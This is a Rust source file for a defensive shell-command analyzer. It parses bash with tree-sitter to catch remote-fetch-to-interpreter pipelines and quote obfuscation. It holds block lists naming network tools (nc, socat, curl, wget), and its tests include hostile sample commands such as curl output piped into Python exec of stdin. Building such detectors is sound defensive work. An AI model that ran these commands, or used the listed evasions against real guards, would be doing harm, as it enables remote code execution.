//! AST-based shell command analysis using tree-sitter-bash
//!
//! Provides robust command parsing that handles obfuscation techniques
//! like quote manipulation, command substitution, and variable expansion.

use once_cell::sync::Lazy;
use std::collections::HashSet;
use std::ops::Range;
use tree_sitter::{Node, Parser, Tree};

/// Shell interpreters that are dangerous when used as pipe targets
static SHELL_INTERPRETERS: Lazy<HashSet<&'static str>> = Lazy::new(|| {
    [
        "sh",
        "bash",
        "zsh",
        "dash",
        "ksh",
        "csh",
        "tcsh",
        "fish",
        "/bin/sh",
        "/bin/bash",
        "/bin/zsh",
        "/bin/dash",
        "/bin/ksh",
        "/usr/bin/sh",
        "/usr/bin/bash",
        "/usr/bin/zsh",
        "/usr/bin/env",
    ]
    .into_iter()
    .collect()
});

/// Wrapper commands that can execute other commands (for pipeline unwrapping)
static PIPELINE_WRAPPERS: Lazy<HashSet<&'static str>> = Lazy::new(|| {
    [
        "xargs", "env", "sudo", "timeout", "nice", "nohup", "ionice", "strace", "time", "unbuffer",
        "watch",
    ]
    .into_iter()
    .collect()
});

/// Commands that fetch remote content. When one of these is the *source* of a
/// pipeline feeding an interpreter, it's remote-code-execution (`curl … | python3`).
/// When the source is a local command, piping to an interpreter is ordinary data
/// processing (`fleetops state show | python3 -c '…'`) and must not be blocked.
static REMOTE_FETCHERS: Lazy<HashSet<&'static str>> = Lazy::new(|| {
    // Unambiguous remote-content fetchers only. Dual-use cloud CLIs (aws, gh,
    // gcloud, az, rclone, s3cmd) are deliberately NOT here: they're overwhelmingly
    // used for `… | python3 -c` data pipelines (the exact pattern P1 exists to
    // allow), so treating them as fetchers would re-introduce the false positives.
    // Residual: remote code fetched via a dual-use CLI and piped to an interpreter
    // is not caught here — a documented tradeoff, revisitable at higher safety levels.
    [
        "curl", "wget", "wget2", "curlie", "xh", "nc", "ncat", "netcat", "fetch", "ssh", "scp",
        "sftp", "ftp", "tftp", "http", "https", "httpie", "aria2c", "axel", "socat", "openssl",
        "lynx", "w3m", "links",
    ]
    .into_iter()
    .collect()
});

/// Script interpreters (also dangerous as pipe targets)
static SCRIPT_INTERPRETERS: Lazy<HashSet<&'static str>> = Lazy::new(|| {
    [
        "python",
        "python2",
        "python3",
        "ruby",
        "perl",
        "node",
        "php",
        "/usr/bin/python",
        "/usr/bin/python3",
        "/usr/bin/ruby",
        "/usr/bin/perl",
        "/usr/bin/node",
    ]
    .into_iter()
    .collect()
});

/// Result of AST-based command analysis
#[derive(Debug, Clone)]
pub struct CommandAnalysis {
    /// All normalized command names found (handles quote obfuscation)
    pub commands: Vec<NormalizedCommand>,
    /// Whether any command position has dynamic execution (variable, substitution)
    pub has_dynamic_command: bool,
    /// Whether there's a pipeline to a shell interpreter
    pub has_pipe_to_shell: bool,
    /// Whether there's a pipeline to a script interpreter
    pub has_pipe_to_interpreter: bool,
    /// Whether ANY pipeline is sourced from remote content (informational).
    pub pipe_source_is_remote: bool,
    /// Whether a SINGLE pipeline has a remote fetcher in some stage AND a later
    /// stage that runs its stdin as code (`curl … | python3`, `nc … | bash | cat`)
    /// — i.e. remote code execution. Computed per-pipeline (with wrapper
    /// unwrapping) so a benign remote pipe in one compound segment and a local
    /// data→interpreter pipe in another don't combine into a false deny. An
    /// interpreter running an inline literal script (`python3 -c '…'`) reads the
    /// fetched bytes as data, not code, and does not set it (uun). This is the
    /// flag the RCE rule keys on.
    pub has_remote_source_to_interpreter: bool,
    /// Byte ranges of pipeline stages (after the first) verified to be an
    /// Python interpreter running allowlisted literal code. The text backstop rule
    /// `curl-pipe-python` is evaluated with these masked out.
    pub inline_script_ranges: Vec<Range<usize>>,
    /// Raw AST parse succeeded
    pub parsed: bool,
    /// Error message if parsing failed
    pub error: Option<String>,
}

/// A normalized command with its arguments
#[derive(Debug, Clone)]
pub struct NormalizedCommand {
    /// The normalized command name (quotes removed, concatenations resolved)
    pub name: String,
    /// The full command line for this command
    pub full_command: String,
    /// Whether the command name was dynamically generated
    pub is_dynamic: bool,
    /// Arguments to the command
    pub arguments: Vec<String>,
}

/// Parse and analyze a bash command using tree-sitter
pub fn analyze_command(source: &str) -> CommandAnalysis {
    let mut parser = Parser::new();

    // Set the bash language
    if parser
        .set_language(&tree_sitter_bash::LANGUAGE.into())
        .is_err()
    {
        return CommandAnalysis {
            commands: vec![],
            has_dynamic_command: false,
            has_pipe_to_shell: false,
            has_pipe_to_interpreter: false,
            pipe_source_is_remote: false,
            has_remote_source_to_interpreter: false,
            inline_script_ranges: vec![],
            parsed: false,
            error: Some("Failed to load tree-sitter-bash language".to_string()),
        };
    }

    let tree = match parser.parse(source, None) {
        Some(t) => t,
        None => {
            return CommandAnalysis {
                commands: vec![],
                has_dynamic_command: false,
                has_pipe_to_shell: false,
                has_pipe_to_interpreter: false,
                pipe_source_is_remote: false,
                has_remote_source_to_interpreter: false,
                inline_script_ranges: vec![],
                parsed: false,
                error: Some("Failed to parse command".to_string()),
            };
        }
    };

    analyze_tree(&tree, source)
}

/// Analyze the parsed AST tree
fn analyze_tree(tree: &Tree, source: &str) -> CommandAnalysis {
    let root = tree.root_node();

    // CRITICAL FIX: Check if the tree has parse errors
    // tree-sitter can return a partial tree with errors, which might miss dangerous patterns
    // If there are errors, mark as not parsed to trigger fallback regex checks
    if root.has_error() {
        return CommandAnalysis {
            commands: vec![],
            has_dynamic_command: false,
            has_pipe_to_shell: false,
            has_pipe_to_interpreter: false,
            pipe_source_is_remote: false,
            has_remote_source_to_interpreter: false,
            inline_script_ranges: vec![],
            parsed: false,
            error: Some("AST contains parse errors - using fallback".to_string()),
        };
    }

    let mut commands = Vec::new();
    let mut has_dynamic_command = false;
    let mut flags = PipeFlags::default();

    // Traverse all nodes looking for commands and pipelines
    collect_commands(&root, source, &mut commands, &mut has_dynamic_command);

    // Check for pipe to shell patterns
    check_pipeline_flow(&root, source, false, false, &mut flags);

    CommandAnalysis {
        commands,
        has_dynamic_command,
        has_pipe_to_shell: flags.pipe_to_shell,
        has_pipe_to_interpreter: flags.pipe_to_interpreter,
        pipe_source_is_remote: flags.source_is_remote,
        has_remote_source_to_interpreter: flags.remote_source_to_interpreter,
        inline_script_ranges: flags.inline_script_ranges,
        parsed: true,
        error: None,
    }
}

/// Accumulated pipeline classification across all pipeline nodes in a command.
#[derive(Default)]
struct PipeFlags {
    /// Any pipeline sinks into a shell interpreter (broad, always dangerous).
    pipe_to_shell: bool,
    /// Any pipeline sinks into a script interpreter (informational).
    pipe_to_interpreter: bool,
    /// Any pipeline is sourced from a remote fetcher (informational).
    source_is_remote: bool,
    /// Some SINGLE pipeline is remote-sourced AND interpreter-sunk (RCE).
    remote_source_to_interpreter: bool,
    /// Stages verified as inline literal scripts (see CommandAnalysis).
    inline_script_ranges: Vec<Range<usize>>,
}

/// Recursively collect all commands from the AST
fn collect_commands(
    node: &Node,
    source: &str,
    commands: &mut Vec<NormalizedCommand>,
    has_dynamic: &mut bool,
) {
    match node.kind() {
        "command" => {
            if let Some(cmd) = extract_command(node, source) {
                if cmd.is_dynamic {
                    *has_dynamic = true;
                }
                commands.push(cmd);
            }
        }
        _ => {
            // Recurse into children
            let mut cursor = node.walk();
            for child in node.children(&mut cursor) {
                collect_commands(&child, source, commands, has_dynamic);
            }
        }
    }
}

/// Extract a normalized command from a command node
fn extract_command(node: &Node, source: &str) -> Option<NormalizedCommand> {
    let full_text = node.utf8_text(source.as_bytes()).ok()?;

    // Find the command_name child
    let mut cursor = node.walk();
    let mut command_name_node = None;
    let mut arguments = Vec::new();
    let mut in_args = false;

    for child in node.children(&mut cursor) {
        match child.kind() {
            "command_name" => {
                command_name_node = Some(child);
                in_args = true;
            }
            "word"
            | "string"
            | "raw_string"
            | "concatenation"
            | "simple_expansion"
            | "expansion"
            | "command_substitution"
                if in_args =>
            {
                if let Ok(text) = child.utf8_text(source.as_bytes()) {
                    arguments.push(normalize_word(&child, source));
                    let _ = text; // Silence warning
                }
            }
            _ => {}
        }
    }

    let command_name_node = command_name_node?;
    let (name, is_dynamic) = normalize_command_name(&command_name_node, source);

    Some(NormalizedCommand {
        name,
        full_command: full_text.to_string(),
        is_dynamic,
        arguments,
    })
}

/// Normalize a command name, handling quote obfuscation and detecting dynamic names
/// Returns (normalized_name, is_dynamic)
fn normalize_command_name(node: &Node, source: &str) -> (String, bool) {
    let mut cursor = node.walk();

    // Check the first child to determine what kind of command name this is
    if let Some(child) = node.children(&mut cursor).next() {
        match child.kind() {
            // Variable expansion in command position = dynamic
            "simple_expansion" | "expansion" => {
                let text = child.utf8_text(source.as_bytes()).unwrap_or("$?");
                return (text.to_string(), true);
            }
            // Command substitution in command position = dynamic
            "command_substitution" => {
                let text = child.utf8_text(source.as_bytes()).unwrap_or("$(...)");
                return (text.to_string(), true);
            }
            // Concatenation (like ba'sh') - normalize it
            "concatenation" => {
                let normalized = normalize_concatenation(&child, source);
                // Check if any part of the concatenation is dynamic
                let is_dynamic = has_dynamic_parts(&child, source);
                return (normalized, is_dynamic);
            }
            // Simple word
            "word" => {
                let text = child.utf8_text(source.as_bytes()).unwrap_or("");
                return (text.to_string(), false);
            }
            // Quoted string - remove quotes
            "string" | "raw_string" => {
                let text = child.utf8_text(source.as_bytes()).unwrap_or("");
                return (strip_quotes(text), false);
            }
            _ => {}
        }
    }

    // Fallback: use raw text
    let text = node.utf8_text(source.as_bytes()).unwrap_or("");
    (text.to_string(), false)
}

/// Normalize a concatenation node (like ba'sh' -> bash)
fn normalize_concatenation(node: &Node, source: &str) -> String {
    let mut result = String::new();
    let mut cursor = node.walk();

    for child in node.children(&mut cursor) {
        match child.kind() {
            "word" => {
                if let Ok(text) = child.utf8_text(source.as_bytes()) {
                    result.push_str(text);
                }
            }
            "string" | "raw_string" => {
                if let Ok(text) = child.utf8_text(source.as_bytes()) {
                    result.push_str(&strip_quotes(text));
                }
            }
            "simple_expansion" | "expansion" | "command_substitution" => {
                // Include as-is for pattern matching but mark as potentially dynamic
                if let Ok(text) = child.utf8_text(source.as_bytes()) {
                    result.push_str(text);
                }
            }
            // Recurse for nested concatenations
            "concatenation" => {
                result.push_str(&normalize_concatenation(&child, source));
            }
            _ => {
                if let Ok(text) = child.utf8_text(source.as_bytes()) {
                    result.push_str(text);
                }
            }
        }
    }

    result
}

/// Check if a node contains dynamic parts (variables, command substitution)
#[allow(clippy::only_used_in_recursion)]
fn has_dynamic_parts(node: &Node, source: &str) -> bool {
    match node.kind() {
        "simple_expansion" | "expansion" | "command_substitution" => true,
        _ => {
            let mut cursor = node.walk();
            for child in node.children(&mut cursor) {
                if has_dynamic_parts(&child, source) {
                    return true;
                }
            }
            false
        }
    }
}

/// Normalize a word (handles quoted strings, concatenations)
fn normalize_word(node: &Node, source: &str) -> String {
    match node.kind() {
        "concatenation" => normalize_concatenation(node, source),
        "string" | "raw_string" => {
            let text = node.utf8_text(source.as_bytes()).unwrap_or("");
            strip_quotes(text)
        }
        _ => node.utf8_text(source.as_bytes()).unwrap_or("").to_string(),
    }
}

/// Strip quotes from a string
fn strip_quotes(s: &str) -> String {
    let s = s.trim();
    if (s.starts_with('"') && s.ends_with('"')) || (s.starts_with('\'') && s.ends_with('\'')) {
        s[1..s.len() - 1].to_string()
    } else {
        s.to_string()
    }
}

/// Classify stdin readers separately from output provenance. Nested pipelines
/// inherit their first stage's stdin and return their last stage's provenance.
/// Sibling statements share stdin, never each other's stdout.
fn check_pipeline_flow(
    node: &Node,
    source: &str,
    input_remote: bool,
    piped: bool,
    flags: &mut PipeFlags,
) -> bool {
    if node.kind() == "pipeline" {
        let mut cursor = node.walk();
        let stages: Vec<_> = node.named_children(&mut cursor).collect();
        // tree-sitter hangs a trailing redirect (`a | b < <(c)`) on a
        // redirected_statement around the whole pipeline; bash applies it to
        // the last stage, so its commands join that stage.
        let mut trailing = Vec::new();
        if let Some(parent) = node.parent() {
            if parent.kind() == "redirected_statement" {
                let mut c = parent.walk();
                for r in parent.named_children(&mut c) {
                    if r.kind().ends_with("_redirect") {
                        trailing.push(r);
                    }
                }
            }
        }
        let mut upstream_remote = input_remote;
        for (i, stage) in stages.iter().enumerate() {
            let stage_input = upstream_remote;
            upstream_remote =
                check_pipeline_flow(stage, source, stage_input, piped || i > 0, flags);
            if i + 1 == stages.len() {
                for r in &trailing {
                    check_pipeline_flow(r, source, stage_input, true, flags);
                }
            }
            flags.source_is_remote |= upstream_remote;
        }
        return upstream_remote;
    }

    let mut output_remote = false;
    if node.kind() == "command" {
        if let Some(cmd) = extract_command(node, source) {
            if piped {
                check_command_for_interpreters(
                    &cmd,
                    &mut flags.pipe_to_shell,
                    &mut flags.pipe_to_interpreter,
                );
                let runs = runs_stdin_as_code(node, source, &mut flags.inline_script_ranges);
                flags.remote_source_to_interpreter |= input_remote && runs;
            }
            // Most commands may forward/transform stdin. Only known producers
            // replace it; notably `nc | (printf x | python3)` stays exempt.
            let replaces_input =
                matches!(cmd.name.rsplit('/').next().unwrap_or(""), "printf" | "echo");
            output_remote = command_is_remote_fetcher(&cmd) || (input_remote && !replaces_input);
        }
    }
    // Subshells, groups, substitutions and redirects inherit this stdin.
    // Union sibling outputs because any of them can contribute remote bytes.
    let mut cursor = node.walk();
    for child in node.named_children(&mut cursor) {
        output_remote |= check_pipeline_flow(&child, source, input_remote, piped, flags);
    }
    output_remote
}

/// Whether a command is (or wraps, via sudo/env/timeout/…) a remote fetcher.
/// Checks the command name and, for wrapper commands, every argument — mirroring
/// the sink-side interpreter check so `sudo wget …`, `env FOO=1 curl …`,
/// `timeout 30 wget …` all resolve to their real fetcher.
fn command_is_remote_fetcher(cmd: &NormalizedCommand) -> bool {
    let base = |s: &str| {
        s.to_lowercase()
            .rsplit('/')
            .next()
            .unwrap_or("")
            .to_string()
    };
    let name = base(&cmd.name);
    if REMOTE_FETCHERS.contains(name.as_str()) {
        return true;
    }
    if PIPELINE_WRAPPERS.contains(name.as_str()) {
        // Resolve the wrapped command: the first argument that is not a flag, a
        // `KEY=VAL` env assignment, or a numeric duration operand (timeout/nice),
        // then test only THAT token. Scanning every argument would over-fire on a
        // fetcher word appearing as data (`nice grep http log | ruby`).
        if let Some(inner) = cmd
            .arguments
            .iter()
            .find(|a| !a.starts_with('-') && !a.contains('=') && !is_duration(a))
        {
            return REMOTE_FETCHERS.contains(base(inner).as_str());
        }
    }
    false
}

/// Whether a token is a bare numeric duration operand (`30`, `30s`, `5m`, `1h`),
/// as consumed by `timeout`/`nice` — so it's skipped when resolving the wrapped
/// command rather than mistaken for it.
fn is_duration(s: &str) -> bool {
    let digits = s.trim_end_matches(['s', 'm', 'h', 'd']);
    !digits.is_empty() && digits.chars().all(|c| c.is_ascii_digit())
}

/// Interpreter families, for the inline-literal-script exemption.
#[derive(Clone, Copy, PartialEq, Eq, Debug)]
enum Interp {
    Shell,
    Python,
    Ruby,
    Perl,
    Node,
    Php,
}

/// Classify a command name as an interpreter, by full name or basename, with
/// version suffixes stripped (`python3.12`, `/opt/homebrew/bin/python3`).
fn interpreter_kind(name: &str) -> Option<Interp> {
    let lower = name.to_lowercase();
    let base = lower.rsplit('/').next().unwrap_or("");
    if SHELL_INTERPRETERS.contains(lower.as_str()) || SHELL_INTERPRETERS.contains(base) {
        return Some(Interp::Shell);
    }
    let stem = base.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.');
    match stem {
        "python" | "pypy" => Some(Interp::Python),
        "ruby" => Some(Interp::Ruby),
        "perl" => Some(Interp::Perl),
        "node" | "nodejs" => Some(Interp::Node),
        "php" => Some(Interp::Php),
        _ => None,
    }
}

/// Whether a pipeline-stage command runs its stdin as code: a shell, a bare
/// interpreter (`python3`, `python3 -`, `python3 script.py`), or an
/// interpreter behind a wrapper (`xargs python3 -c`, `env python3 …`). An
/// Python interpreter invoked directly with allowlisted literal code reads stdin as
/// data; its range is recorded in `inline_ranges` and it does not count.
fn runs_stdin_as_code(node: &Node, source: &str, inline_ranges: &mut Vec<Range<usize>>) -> bool {
    let Some(cmd) = extract_command(node, source) else {
        return false;
    };
    match interpreter_kind(&cmd.name) {
        Some(Interp::Shell) => true,
        Some(kind) => {
            if is_inline_literal_script(node, source, kind) {
                inline_ranges.push(node.byte_range());
                false
            } else {
                true
            }
        }
        None => {
            let lower = cmd.name.to_lowercase();
            let base = lower.rsplit('/').next().unwrap_or("");
            if !PIPELINE_WRAPPERS.contains(base) {
                return false;
            }
            let mut cursor = node.walk();
            let runs = node
                .named_children(&mut cursor)
                .skip_while(|child| child.kind() != "command_name")
                .skip(1)
                .filter(|child| !child.kind().ends_with("_redirect"))
                .any(|arg| {
                    // Wrappers can reparse arguments as command text. Decode
                    // them too, and treat uncertain values as code.
                    let Some(value) = decode_literal_word(&arg, source) else {
                        return true;
                    };
                    (base == "env" && env_splits_string(&value))
                        || value
                            .split_whitespace()
                            .any(|token| interpreter_kind(token).is_some())
                });
            runs
        }
    }
}

/// Split-string options can embed an entire command, including in the option
/// itself. Treat all such env invocations as code, even for unknown commands.
fn env_splits_string(arg: &str) -> bool {
    arg == "--split-string"
        || arg.starts_with("--split-string=")
        || (arg.starts_with('-') && !arg.starts_with("--") && arg.contains('S'))
}

/// Node kinds whose text is not fixed at parse time.
const DYNAMIC_KINDS: &[&str] = &[
    "simple_expansion",
    "expansion",
    "command_substitution",
    "process_substitution",
    "arithmetic_expansion",
];

fn contains_kind(node: &Node, kinds: &[&str]) -> bool {
    if kinds.contains(&node.kind()) {
        return true;
    }
    let mut cursor = node.walk();
    let found = node.children(&mut cursor).any(|c| contains_kind(&c, kinds));
    found
}

/// Whether `node` is an interpreter command running an inline literal script:
/// `python3 -c '<code>'`, `ruby -e`, `perl -ne`, `node -e`, `php -r`. Strict:
/// - an env-assignment prefix only for locale-style names (`LC_ALL=C`), never
///   interpreter settings (`PYTHONINSPECT=1` reads stdin as code);
/// - only known-harmless flags before the code flag (`python3 -i` would too);
/// - the code and every flag decoded literals: no `$x`, `$(…)`, `<(…)`, `$'…'`
///   or unquoted backslash escapes (`\--interactive`);
/// - after the code, only plain non-flag words, except for Python (its `-c`
///   ends option parsing; later words are `sys.argv`);
/// - Python code must parse within the explicit data-processing allowlist;
///   other interpreter families have no inline-code exemption.
fn is_inline_literal_script(node: &Node, source: &str, kind: Interp) -> bool {
    // (decoded shell value, literal?) per argument, in order.
    let mut args: Vec<(String, bool)> = Vec::new();
    let mut seen_name = false;
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        let k = child.kind();
        if k == "command_name" {
            seen_name = true;
        } else if k.ends_with("_redirect") {
            if contains_kind(&child, DYNAMIC_KINDS) {
                return false;
            }
        } else if !seen_name {
            if !is_harmless_assignment(&child, source) {
                return false;
            }
        } else if child.is_named() {
            args.push(match decode_literal_word(&child, source) {
                Some(value) => (value, true),
                None => (String::new(), false),
            });
        }
    }

    let mut i = 0;
    let code = loop {
        let Some((a, lit)) = args.get(i) else {
            return false; // no inline-code flag: a script file or stdin
        };
        if !lit {
            return false;
        }
        if let Some(attached) = attached_code(kind, a) {
            i += 1;
            break attached;
        }
        if is_code_flag(kind, a) {
            match args.get(i + 1) {
                Some((c, true)) => {
                    i += 2;
                    break c.as_str();
                }
                _ => return false,
            }
        }
        let Some(operands) = leading_flag_operands(kind, a) else {
            return false;
        };
        for j in 1..=operands {
            match args.get(i + j) {
                Some((o, true)) if safe_python_option_operand(a, o) => {}
                _ => return false,
            }
        }
        i += 1 + operands;
    };
    if !inline_code_is_allowlisted(kind, code) {
        return false;
    }
    kind == Interp::Python || args[i..].iter().all(|(a, lit)| *lit && !a.starts_with('-'))
}

/// Decode only shell word kinds whose value we can establish with certainty.
/// In double quotes bash only consumes backslashes before \, ", $, ` and LF.
fn decode_literal_word(node: &Node, source: &str) -> Option<String> {
    let text = node.utf8_text(source.as_bytes()).ok()?;
    if text.bytes().any(|b| matches!(b, 0 | b'\r' | 0x0c))
        || contains_kind(node, DYNAMIC_KINDS)
        || contains_kind(node, &["ansi_c_string"])
    {
        return None;
    }
    match node.kind() {
        "word" | "number" => {
            (!text.contains(['\\', '*', '?', '[', ']', '~', '{', '}'])).then(|| text.to_string())
        }
        "raw_string" => Some(text.strip_prefix('\'')?.strip_suffix('\'')?.to_string()),
        "string" => {
            let inner = text.strip_prefix('"')?.strip_suffix('"')?;
            let mut value = String::new();
            let mut chars = inner.chars();
            while let Some(c) = chars.next() {
                if c == '\\' {
                    let next = chars.next()?;
                    match next {
                        '\\' | '"' | '$' | '`' => value.push(next),
                        '\n' => {}
                        _ => {
                            value.push('\\');
                            value.push(next);
                        }
                    }
                } else {
                    value.push(c);
                }
            }
            Some(value)
        }
        "concatenation" => {
            let mut value = String::new();
            let mut end = node.start_byte();
            let mut cursor = node.walk();
            for child in node.named_children(&mut cursor) {
                if child.start_byte() != end {
                    return None;
                }
                value.push_str(&decode_literal_word(&child, source)?);
                end = child.end_byte();
            }
            (end == node.end_byte()).then_some(value)
        }
        _ => None,
    }
}

/// A `NAME=value` prefix that can't change how an interpreter reads stdin:
/// locale and display settings with a plain literal value.
fn is_harmless_assignment(node: &Node, source: &str) -> bool {
    if node.kind() != "variable_assignment" {
        return false;
    }
    let text = node.utf8_text(source.as_bytes()).unwrap_or("");
    let name = text.split('=').next().unwrap_or("");
    let safe_name = name.starts_with("LC_")
        || matches!(
            name,
            "LANG" | "LANGUAGE" | "TZ" | "NO_COLOR" | "TERM" | "COLUMNS"
        );
    let mut c = node.walk();
    let value_ok = node
        .named_children(&mut c)
        .skip(1)
        .all(|v| decode_literal_word(&v, source).is_some());
    safe_name && value_ok
}

/// The code of an attached form: `-c'print(1)'` (Python), `--eval=…` (Node).
fn attached_code(kind: Interp, a: &str) -> Option<&str> {
    let code = match kind {
        Interp::Python => a.strip_prefix("-c"),
        Interp::Node => a
            .strip_prefix("--eval=")
            .or_else(|| a.strip_prefix("--print=")),
        _ => None,
    }?;
    (!code.is_empty()).then_some(code)
}

/// A short-flag cluster such as `-ne`: `-`, then letters from `allowed`, then
/// one of `last`.
fn is_flag_cluster(a: &str, allowed: &str, last: &[char]) -> bool {
    let Some(body) = a.strip_prefix('-') else {
        return false;
    };
    let mut chars: Vec<char> = body.chars().collect();
    match chars.pop() {
        Some(c) if last.contains(&c) => chars.iter().all(|c| allowed.contains(*c)),
        _ => false,
    }
}

fn is_code_flag(kind: Interp, a: &str) -> bool {
    match kind {
        Interp::Python => a == "-c",
        Interp::Ruby => is_flag_cluster(a, "nplaw", &['e']),
        Interp::Perl => is_flag_cluster(a, "lnpaw", &['e', 'E']),
        Interp::Node => matches!(a, "-e" | "--eval" | "-p" | "--print"),
        Interp::Php => a == "-r",
        Interp::Shell => false,
    }
}

/// For a known-harmless flag before the code flag, how many operands it takes
/// (`-W ignore` takes one). `None` for anything else.
fn leading_flag_operands(kind: Interp, a: &str) -> Option<usize> {
    let harmless = match kind {
        Interp::Python => {
            if matches!(a, "-W" | "-X") {
                return Some(1);
            }
            if a.starts_with("-W") || a.starts_with("-X") {
                return safe_python_option_operand(&a[..2], &a[2..]).then_some(0);
            }
            matches!(
                a,
                "-u" | "-B" | "-E" | "-s" | "-S" | "-I" | "-O" | "-OO" | "-q" | "-b" | "-bb" | "-P"
            )
        }
        Interp::Ruby => is_flag_cluster(a, "nplaw", &['n', 'p', 'l', 'a', 'w']),
        Interp::Perl => is_flag_cluster(a, "lnpaw", &['l', 'n', 'p', 'a', 'w']),
        Interp::Node => matches!(
            a,
            "--no-warnings" | "--input-type=module" | "--input-type=commonjs"
        ),
        Interp::Php => a == "-n",
        Interp::Shell => false,
    };
    harmless.then_some(0)
}

fn safe_python_option_operand(flag: &str, operand: &str) -> bool {
    match flag {
        "-W" => matches!(
            operand,
            "ignore" | "default" | "error" | "always" | "module" | "once"
        ),
        "-X" => matches!(operand, "utf8" | "utf8=0" | "utf8=1"),
        _ => false,
    }
}

/// Fail closed: only Python has a tokenized, restricted data-processing grammar.
/// Ruby, Perl, Node and PHP have no exemption: their execution/interpolation
/// semantics need separate parsers before they can be safely allowlisted.
fn inline_code_is_allowlisted(kind: Interp, code: &str) -> bool {
    kind == Interp::Python && super::inline_python::is_allowlisted(code)
}

/// `command` with each range replaced by a neutral token, for running text
/// rules on the parts the AST did not clear. Ranges come from tree-sitter, so
/// they sit on char boundaries; overlapping or duplicate ranges are skipped.
pub fn mask_ranges(command: &str, ranges: &[Range<usize>]) -> String {
    let mut sorted: Vec<_> = ranges.to_vec();
    sorted.sort_by_key(|r| (r.start, r.end));
    let mut out = String::with_capacity(command.len());
    let mut pos = 0;
    for r in sorted {
        if r.start < pos || r.end > command.len() {
            continue;
        }
        out.push_str(&command[pos..r.start]);
        out.push_str("inline-literal-script");
        pos = r.end;
    }
    out.push_str(&command[pos..]);
    out
}

/// Check a command (and its arguments) for shell/script interpreters
/// This handles wrappers like xargs, env, etc.
fn check_command_for_interpreters(
    cmd: &NormalizedCommand,
    has_pipe_to_shell: &mut bool,
    has_pipe_to_interpreter: &mut bool,
) {
    let normalized_name = cmd.name.to_lowercase();

    // Direct interpreter check
    if SHELL_INTERPRETERS.contains(normalized_name.as_str()) {
        *has_pipe_to_shell = true;
        return;
    }
    if SCRIPT_INTERPRETERS.contains(normalized_name.as_str()) {
        *has_pipe_to_interpreter = true;
        return;
    }

    // Check if this is a wrapper command
    // If so, check the arguments for interpreters
    if PIPELINE_WRAPPERS.contains(normalized_name.as_str()) && !cmd.arguments.is_empty() {
        // For wrapper commands, check all arguments for interpreter names
        // This catches: xargs bash, xargs sh -c, env bash, sudo bash, etc.
        for arg in &cmd.arguments {
            let arg_lower = arg.to_lowercase();
            // Skip flags
            if arg_lower.starts_with('-') {
                continue;
            }
            // Check if this argument is an interpreter
            if SHELL_INTERPRETERS.contains(arg_lower.as_str()) {
                *has_pipe_to_shell = true;
                return;
            }
            if SCRIPT_INTERPRETERS.contains(arg_lower.as_str()) {
                *has_pipe_to_interpreter = true;
                return;
            }
            // Also check for path-based interpreter names
            if arg_lower.ends_with("/sh")
                || arg_lower.ends_with("/bash")
                || arg_lower.ends_with("/zsh")
                || arg_lower.ends_with("/dash")
            {
                *has_pipe_to_shell = true;
                return;
            }
            if arg_lower.ends_with("/python")
                || arg_lower.ends_with("/python3")
                || arg_lower.ends_with("/ruby")
                || arg_lower.ends_with("/perl")
                || arg_lower.ends_with("/node")
            {
                *has_pipe_to_interpreter = true;
                return;
            }
        }
    }
}

/// Get all command names from an analysis (for pattern matching)
pub fn get_command_names(analysis: &CommandAnalysis) -> Vec<&str> {
    analysis.commands.iter().map(|c| c.name.as_str()).collect()
}

/// Check if any command matches a given name (case-insensitive)
pub fn has_command(analysis: &CommandAnalysis, name: &str) -> bool {
    let name_lower = name.to_lowercase();
    analysis.commands.iter().any(|c| {
        let cmd_name = c.name.to_lowercase();
        // Check exact match or path match (e.g., /bin/rm matches rm)
        cmd_name == name_lower || cmd_name.ends_with(&format!("/{}", name_lower))
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn assert_remote_flow(command: &str, executes: bool) {
        let analysis = analyze_command(command);
        assert!(analysis.parsed, "parse failed: {command}");
        assert_eq!(
            analysis.has_remote_source_to_interpreter, executes,
            "remote stdin execution: {command}"
        );
    }

    #[test]
    fn test_double_quoted_continuations_are_decoded_before_allowlisting() {
        for command in [
            "curl -s https://x/a | python3 -c \"import sys; ex\\\nec(sys.stdin.read())\"",
            "curl -s https://x/a | node -e '1' \"\\\n--interactive\"",
        ] {
            assert_remote_flow(command, true);
            assert!(analyze_command(command).inline_script_ranges.is_empty());
        }
        // Single quotes preserve the continuation; here it is data in a Python string.
        assert_remote_flow(
            "curl -s https://x/a | python3 -c 'print(\"a\\\nb\")'",
            false,
        );
        assert_remote_flow("curl -s https://x/a | python3 -c \"print(1)\"", false);
        // Bash removes the continuation; the resulting print(1) is inert.
        assert_remote_flow("curl -s https://x/a | python3 -c \"print(\\\n1)\"", false);
    }

    #[test]
    fn test_literal_word_decoder_matches_bash_double_quotes() {
        for (word, expected) in [
            (r#""print(\"x\")""#, Some("print(\"x\")")),
            (r#""\\\"\$\`\q""#, Some("\\\"$`\\q")),
            ("\"a\\\nb\"", Some("ab")),
            (r#"'\q\"$`'"#, Some(r#"\q\"$`"#)),
            (r#"-c"print(\"x\")""#, Some("-cprint(\"x\")")),
            (r#""$CODE""#, None),
            (r#""$(cat code)""#, None),
            (r#""`cat code`""#, None),
            (r#"$'print(1)'"#, None),
            (r#"\--interactive"#, None),
            ("*", None),
            ("~", None),
        ] {
            let source = format!("python3 {word}");
            let mut parser = Parser::new();
            parser
                .set_language(&tree_sitter_bash::LANGUAGE.into())
                .unwrap();
            let tree = parser.parse(&source, None).unwrap();
            let command = tree.root_node().named_child(0).unwrap();
            let arg = command.named_child(1).unwrap();
            assert_eq!(
                decode_literal_word(&arg, &source).as_deref(),
                expected,
                "{word}"
            );
        }
    }

    #[test]
    fn test_python_lexer_rejects_control_bytes_in_comments_and_literals() {
        for byte in ['\r', '\0', '\u{c}'] {
            for code in [
                format!("print(1){byte}"),
                format!("print(1)#{byte}print(2)"),
                format!("print(\"x{byte}y\")"),
                format!("{byte}print(1)"),
            ] {
                assert!(
                    !inline_code_is_allowlisted(Interp::Python, &code),
                    "{code:?}"
                );
            }
        }
        assert!(inline_code_is_allowlisted(Interp::Python, "print(\t1)"));
    }

    #[test]
    fn test_perl_substitutions_have_no_exemption_with_any_delimiter() {
        for delimiter in [
            '/', '~', ':', '!', '#', '|', '%', '@', '?', '=', ';', ',', '.', '+', '-', '^', '&',
            '*', '"', '\'', ')', ']', '}', '>', '§',
        ] {
            for modifiers in ["e", "ee", "eee", "igee"] {
                let code = format!("s{delimiter}a{delimiter}1{delimiter}{modifiers}");
                assert!(
                    !inline_code_is_allowlisted(Interp::Perl, &code),
                    "must block: {code}"
                );
            }
